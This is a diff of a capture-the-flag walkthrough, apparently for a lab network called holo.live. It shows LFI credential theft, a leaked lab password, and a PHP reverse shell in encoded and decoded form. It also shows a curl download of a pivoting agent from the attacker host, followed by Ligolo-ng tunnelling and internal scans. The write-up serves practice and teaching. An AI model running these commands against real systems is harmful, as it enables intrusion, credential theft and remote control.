@@ -765,9 +765,11 @@ Connect to VPN and check your route:
 Check your IP
 
     tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
-        inet 10.50.74.35  netmask 255.255.255.0  destination 10.50.74.35
+    inet 10.50.74.35  netmask 255.255.255.0  destination 10.50.74.35
 
 Start to identify hosts:
+
+    nmap -sn 10.200.95.0/24
 
     Nmap scan report for 10.200.95.33
     Host is up (0.084s latency).
@@ -854,7 +856,11 @@ The application is vulnerable to LFI, and we can exploit to get some sensitive d
 
     http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
 
-The file is downloaded as img.php and inside we can filnd some credentials. I used the credentials to access the admin app. Once logged in we can see that there is nothing we can do in pratical, I mean no way to upload o inject a webshell. Again inspecting the souce of the page I found an interesting comment:
+The file is downloaded as img.php and inside we can filnd some credentials.
+
+[//]: # (admin:DBManagerLogin!)
+
+I used the credentials to access the admin app. Once logged in we can see that there is nothing we can do in pratical, I mean no way to upload o inject a webshell. Again inspecting the souce of the page I found an interesting comment:
 
     <!--                   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
 
@@ -882,13 +888,70 @@ We can get the OS version as well:
 
 Futher enumerations reveals that python is not installed, indeed PHP is 7.2.24, then I tried a PHP reverse shell:
 
-    http://admin.holo.live/dashboard.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+    http://admin.holo.live/dashboard.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1234%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
-For sake of learning this is the decoded command used
+For sake of learning this is the decoded command used:
 
-    php -r '$sock=fsockopen("10.50.74.35",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+    php -r '$sock=fsockopen("10.50.74.35",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
 
-The IP refers to my tun0 interface, of course
+The IP refers to my tun0 interface, of course.
+
+Once I got a shell, running ip config we can see that we are inside the subnet 
+
+    192.168.100.0   0.0.0.0         255.255.255.0
+
+Our IP is .100.
+### Flag submission 1
+In /var subdirs you can find the first flag.
+
+### Pivoting
+As usual to perform this task I use Ligolo-NG. I downloaded it from attacker machine, since wget it's not installed I used curl:
+
+    cd /tmp && curl -O http://10.50.74.35:8000/agent
+    chmod u+x agent
+
+Then on my attacker machine configure the proxy (execute the command as root).
+
+    ip tuntap add user root mode tun ligolo && ip link set ligolo up
+Add route to the victim subnet
+
+    ip route add 192.168.100.0/24   dev ligolo
+Start the server on the attacker:
+
+    ./ligolo_proxy -selfcer
+
+Coming back to the victim, start the agent:
+
+    ./agent -connect 10.50.74.35:11601 -ignore-cert
+
+On the attacker ligolo console start the session:
+
+    [Agent : www-data@266b41428577] » tunnel_start 
+    [Agent : www-data@266b41428577] » INFO[0481] Starting tunnel to www-data@266b41428577    
+
+Now from our machine we can perform a host discovery scan:
+
+    nmap -sn 192.168.100.0/24
+    ...
+    Nmap scan report for 192.168.100.1
+    Host is up (0.17s latency).
+    Nmap scan report for 192.168.100.100
+    Host is up (0.13s latency).
+
+Apart the victim, we found another active host in the network, that actualy is the default GW for the subnet (route -n on the victim). Now performing a ports scanner:
+
+    rustscan -b 900 -a 192.168.100.1
+    ...
+    PORT      STATE SERVICE    REASON
+    22/tcp    open  ssh        syn-ack
+    80/tcp    open  http       syn-ack
+    3306/tcp  open  mysql      syn-ack
+    8080/tcp  open  http-proxy syn-ack
+    33060/tcp open  mysqlx     syn-ack
+
+The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080.
+    
+
 
 
     
